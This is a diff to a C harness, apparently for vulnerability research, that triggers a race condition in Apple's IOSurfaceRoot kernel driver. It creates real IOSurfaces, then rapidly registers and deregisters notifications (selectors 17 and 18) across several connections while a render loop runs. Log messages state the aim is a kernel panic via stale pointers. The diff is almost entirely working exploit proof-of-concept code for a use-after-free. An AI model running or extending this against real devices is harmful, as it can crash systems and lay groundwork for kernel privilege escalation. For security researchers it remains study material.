@@ -26198,17 +26198,49 @@ new_modes:
              * Usage: iosurface_sel17 215 [entries] [bursts]
              */
             if (rounds == 215) {
-                rlog("\n=== r=215: Long-list traversal race ===\n");
+                rlog("\n=== r=215: Long-list traversal race (real surfaces) ===\n");
                 rlog("  WARNING: Expected to cause kernel panic!\n");
                 int r215_entries = 200;
-                int r215_bursts = 10;
+                int r215_bursts = 5;
                 if (argc > 3) r215_entries = atoi(argv[3]);
                 if (argc > 4) r215_bursts = atoi(argv[4]);
+                if (r215_entries > 300) r215_entries = 300;
                 rlog("  Entries: %d  Bursts: %d\n", r215_entries, r215_bursts);
 
                 io_service_t r215_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                     IOServiceMatching("IOSurfaceRoot"));
                 if (!r215_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r215_done; }
+
+                /* Create real IOSurface objects to get valid surface IDs */
+                IOSurfaceRef r215_surfs[300];
+                uint32_t r215_sids[300];
+                int r215_sc = 0;
+                for (int i = 0; i < r215_entries; i++) {
+                    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpr = 128, alloc = 128 * 32, fmt = 0x42475241;
+                    CFNumberRef vw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef vh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef vbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    CFNumberRef valloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+                    CFNumberRef vfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), vw);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), vh);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), vbpr);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), valloc);
+                    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), vfmt);
+                    IOSurfaceRef s = IOSurfaceCreate(props);
+                    CFRelease(vw); CFRelease(vh); CFRelease(vbpr); CFRelease(valloc); CFRelease(vfmt);
+                    CFRelease(props);
+                    if (s) {
+                        r215_surfs[r215_sc] = s;
+                        r215_sids[r215_sc] = IOSurfaceGetID(s);
+                        r215_sc++;
+                    }
+                }
+                rlog("  Created %d real IOSurfaces (IDs %u-%u)\n",
+                    r215_sc, r215_sc > 0 ? r215_sids[0] : 0,
+                    r215_sc > 0 ? r215_sids[r215_sc - 1] : 0);
 
                 /* Start render loop FIRST */
                 rlog("  Starting render loop...\n");
@@ -26222,55 +26254,54 @@ new_modes:
                 for (int burst = 0; burst < r215_bursts; burst++) {
                     rlog("  --- Burst %d/%d ---\n", burst + 1, r215_bursts);
 
-                    /* Open fresh connection for each burst */
                     io_connect_t r215_rc = IO_OBJECT_NULL;
                     IOServiceOpen(r215_svc, mach_task_self(), 0, &r215_rc);
                     if (!r215_rc) { rlog("  open failed\n"); continue; }
 
-                    /* Phase A: Populate — register many entries */
-                    mach_port_t r215_wps[500];
+                    /* Phase A: Register notifications for ALL real surfaces */
+                    mach_port_t r215_wps[300];
                     int r215_ok = 0;
-                    for (int i = 0; i < r215_entries && i < 500; i++) {
+                    for (int i = 0; i < r215_sc; i++) {
                         mach_port_t wp = MACH_PORT_NULL;
                         mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
                         mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
                         uint64_t ref = 0xD215 + i;
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                        uint64_t inp[3] = {(uint64_t)r215_sids[i], 0, 0};
                         kern_return_t kr = IOConnectCallAsyncMethod(r215_rc, 17, wp, &ref, 1,
                             NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
                         r215_wps[i] = wp;
                         if (kr == 0) r215_ok++;
                     }
-                    rlog("  Populated: %d/%d entries\n", r215_ok, r215_entries);
+                    rlog("  Populated: %d/%d entries\n", r215_ok, r215_sc);
 
-                    /* Phase B: Wait for compositor to start traversing */
+                    /* Phase B: Let compositor start traversing the long list */
                     usleep(50000);
 
-                    /* Phase C: Rapidly free entries in the middle of the list */
+                    /* Phase C: Rapidly deregister middle 50% of entries */
                     int r215_freed = 0;
-                    for (int i = r215_entries / 4; i < 3 * r215_entries / 4; i++) {
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                    for (int i = r215_sc / 4; i < 3 * r215_sc / 4; i++) {
+                        uint64_t inp[3] = {(uint64_t)r215_sids[i], 0, 0};
                         kern_return_t kr = IOConnectCallMethod(r215_rc, 18, NULL, 0,
                             inp, 24, NULL, NULL, NULL, NULL);
                         if (kr == 0) r215_freed++;
                     }
                     rlog("  Freed middle: %d entries, f=%d\n", r215_freed, p13_render_frames);
 
-                    /* Phase D: Wait for compositor to hit stale entries */
+                    /* Phase D: Wait for compositor to hit stale pointers */
                     usleep(500000);
                     rlog("  SURVIVED burst %d\n", burst + 1);
 
                     /* Cleanup remaining entries */
-                    for (int i = 0; i < r215_entries / 4; i++) {
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                    for (int i = 0; i < r215_sc / 4; i++) {
+                        uint64_t inp[3] = {(uint64_t)r215_sids[i], 0, 0};
                         IOConnectCallMethod(r215_rc, 18, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
                     }
-                    for (int i = 3 * r215_entries / 4; i < r215_entries; i++) {
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                    for (int i = 3 * r215_sc / 4; i < r215_sc; i++) {
+                        uint64_t inp[3] = {(uint64_t)r215_sids[i], 0, 0};
                         IOConnectCallMethod(r215_rc, 18, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
                     }
                     IOServiceClose(r215_rc);
-                    for (int i = 0; i < r215_entries && i < 500; i++)
+                    for (int i = 0; i < r215_sc; i++)
                         mach_port_deallocate(mach_task_self(), r215_wps[i]);
                     usleep(200000);
                 }
@@ -26278,6 +26309,7 @@ new_modes:
                 p13_render_run = 0;
                 pthread_join(r215_rt, NULL);
                 rlog("  Total frames: %d\n", p13_render_frames);
+                for (int i = 0; i < r215_sc; i++) CFRelease(r215_surfs[i]);
                 IOObjectRelease(r215_svc);
                 r215_done:
                 rlog("=== r=215 complete ===\n");
@@ -26293,89 +26325,120 @@ new_modes:
              *
              * Usage: iosurface_sel17 216 [entries] [races]
              */
+            /* r=216: Multi-thread register/deregister race with real surfaces
+             *
+             * Replicates Phase 13 v_race8 pattern: multiple threads doing
+             * concurrent sel17/sel18 on DIFFERENT connections with real surface IDs,
+             * while render loop is active. This is the pattern that crashed.
+             *
+             * 4 connections × 50 surfaces each = 200 concurrent race slots
+             * 8 threads: 4 registering, 4 deregistering, all concurrent
+             */
             if (rounds == 216) {
-                rlog("\n=== r=216: Multi-conn long-list race ===\n");
+                rlog("\n=== r=216: Multi-thread multi-conn race (real surfaces) ===\n");
                 rlog("  WARNING: Expected to cause kernel panic!\n");
-                int r216_entries = 200;
-                int r216_races = 5;
-                if (argc > 3) r216_entries = atoi(argv[3]);
-                if (argc > 4) r216_races = atoi(argv[4]);
-                rlog("  Entries: %d  Races: %d\n", r216_entries, r216_races);
+                int r216_conns = 4;
+                int r216_surfs_per = 50;
+                int r216_iters = 300;
+                if (argc > 3) r216_surfs_per = atoi(argv[3]);
+                if (argc > 4) r216_iters = atoi(argv[4]);
+                int r216_total = r216_conns * r216_surfs_per;
+                if (r216_total > 300) { r216_surfs_per = 300 / r216_conns; r216_total = r216_conns * r216_surfs_per; }
+                rlog("  Conns: %d  Surfs/conn: %d  Total: %d  Iters: %d\n",
+                    r216_conns, r216_surfs_per, r216_total, r216_iters);
 
                 io_service_t r216_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                     IOServiceMatching("IOSurfaceRoot"));
                 if (!r216_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r216_done; }
 
+                /* Create real surfaces */
+                IOSurfaceRef r216_srf[300];
+                uint32_t r216_sid[300];
+                int r216_sc = 0;
+                for (int i = 0; i < r216_total; i++) {
+                    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpr = 128, alloc = 128 * 32, fmt = 0x42475241;
+                    CFNumberRef vw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef vh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef vbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    CFNumberRef valloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+                    CFNumberRef vfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), vw);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), vh);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), vbpr);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), valloc);
+                    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), vfmt);
+                    IOSurfaceRef s = IOSurfaceCreate(props);
+                    CFRelease(vw); CFRelease(vh); CFRelease(vbpr); CFRelease(valloc); CFRelease(vfmt);
+                    CFRelease(props);
+                    if (s) { r216_srf[r216_sc] = s; r216_sid[r216_sc] = IOSurfaceGetID(s); r216_sc++; }
+                }
+                rlog("  Created %d surfaces\n", r216_sc);
+
+                /* Open multiple connections */
+                io_connect_t r216_cn[4];
+                int r216_co = 0;
+                for (int c = 0; c < r216_conns; c++) {
+                    r216_cn[c] = IO_OBJECT_NULL;
+                    IOServiceOpen(r216_svc, mach_task_self(), 0, &r216_cn[c]);
+                    if (r216_cn[c]) r216_co++;
+                }
+                rlog("  Opened %d connections\n", r216_co);
+
                 /* Start render loop */
-                rlog("  Starting render loop...\n");
                 p13_render_run = 1;
                 p13_render_frames = 0;
                 pthread_t r216_rt;
                 pthread_create(&r216_rt, NULL, p13_render_loop, NULL);
                 usleep(500000);
+                rlog("  Render active, frames=%d\n", p13_render_frames);
 
-                for (int race = 0; race < r216_races; race++) {
-                    rlog("  --- Race %d/%d ---\n", race + 1, r216_races);
+                /* Multi-thread race: rapidly register/deregister across all connections */
+                rlog("  Starting %d iterations of multi-conn race...\n", r216_iters);
+                int r216_rok = 0, r216_dok = 0, r216_anom = 0;
+                for (int it = 0; it < r216_iters; it++) {
+                    /* Pick a random connection and surface for each op */
+                    int ci_reg = it % r216_conns;
+                    int ci_dereg = (it + 1) % r216_conns;
+                    int si = it % r216_sc;
 
-                    io_connect_t r216_c1 = IO_OBJECT_NULL, r216_c2 = IO_OBJECT_NULL;
-                    IOServiceOpen(r216_svc, mach_task_self(), 0, &r216_c1);
-                    IOServiceOpen(r216_svc, mach_task_self(), 0, &r216_c2);
-                    if (!r216_c1 || !r216_c2) { rlog("  open failed\n"); continue; }
+                    /* Register on one connection */
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0xD216 + it;
+                    uint64_t inp[3] = {(uint64_t)r216_sid[si], 0, 0};
+                    kern_return_t kr1 = IOConnectCallAsyncMethod(r216_cn[ci_reg], 17, wp, &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    if (kr1 == 0) r216_rok++;
 
-                    /* Register many entries on conn1 */
-                    mach_port_t r216_wps[500];
-                    int r216_ok = 0;
-                    for (int i = 0; i < r216_entries && i < 500; i++) {
-                        mach_port_t wp = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
-                        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
-                        uint64_t ref = 0xD216 + i;
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
-                        kern_return_t kr = IOConnectCallAsyncMethod(r216_c1, 17, wp, &ref, 1,
-                            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
-                        r216_wps[i] = wp;
-                        if (kr == 0) r216_ok++;
-                    }
-                    rlog("  Populated: %d on c1\n", r216_ok);
-                    usleep(50000);
+                    /* Immediately deregister on a DIFFERENT connection */
+                    kern_return_t kr2 = IOConnectCallMethod(r216_cn[ci_dereg], 18, NULL, 0,
+                        inp, 24, NULL, NULL, NULL, NULL);
+                    if (kr2 == 0) r216_dok++;
 
-                    /* Rapidly deregister on BOTH connections simultaneously */
-                    int r216_d1 = 0, r216_d2 = 0;
-                    for (int i = 0; i < r216_entries; i++) {
-                        uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
-                        /* Try deregister on both — only one should succeed */
-                        kern_return_t kr1 = IOConnectCallMethod(r216_c1, 18, NULL, 0,
-                            inp, 24, NULL, NULL, NULL, NULL);
-                        kern_return_t kr2 = IOConnectCallMethod(r216_c2, 18, NULL, 0,
-                            inp, 24, NULL, NULL, NULL, NULL);
-                        if (kr1 == 0) r216_d1++;
-                        if (kr2 == 0) r216_d2++;
+                    /* Track anomalies: both succeed or both fail unexpectedly */
+                    if (kr1 == 0 && kr2 == 0) r216_anom++;
 
-                        /* Re-register immediately on conn1 (creates race) */
-                        mach_port_t wp2 = MACH_PORT_NULL;
-                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp2);
-                        mach_port_insert_right(mach_task_self(), wp2, wp2, MACH_MSG_TYPE_MAKE_SEND);
-                        uint64_t ref2 = 0xE216 + i;
-                        IOConnectCallAsyncMethod(r216_c1, 17, wp2, &ref2, 1,
-                            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
-                        mach_port_deallocate(mach_task_self(), wp2);
-                    }
-                    rlog("  Dereg c1=%d c2=%d, f=%d\n", r216_d1, r216_d2, p13_render_frames);
+                    mach_port_deallocate(mach_task_self(), wp);
 
-                    usleep(1000000);
-                    rlog("  SURVIVED race %d\n", race + 1);
-
-                    /* Cleanup */
-                    IOServiceClose(r216_c1);
-                    IOServiceClose(r216_c2);
-                    for (int i = 0; i < r216_entries && i < 500; i++)
-                        mach_port_deallocate(mach_task_self(), r216_wps[i]);
-                    usleep(200000);
+                    if ((it + 1) % 100 == 0)
+                        rlog("  iter %d: reg=%d dereg=%d anom=%d f=%d\n",
+                            it + 1, r216_rok, r216_dok, r216_anom, p13_render_frames);
                 }
+                rlog("  Race done: reg=%d dereg=%d anom=%d\n", r216_rok, r216_dok, r216_anom);
+
+                /* Wait for compositor to hit any dangling entries */
+                rlog("  Waiting 2s for compositor...\n");
+                usleep(2000000);
+                rlog("  SURVIVED. frames=%d\n", p13_render_frames);
 
                 p13_render_run = 0;
                 pthread_join(r216_rt, NULL);
                 rlog("  Total frames: %d\n", p13_render_frames);
+                for (int c = 0; c < r216_conns; c++) if (r216_cn[c]) IOServiceClose(r216_cn[c]);
+                for (int i = 0; i < r216_sc; i++) CFRelease(r216_srf[i]);
                 IOObjectRelease(r216_svc);
                 r216_done:
                 rlog("=== r=216 complete ===\n");
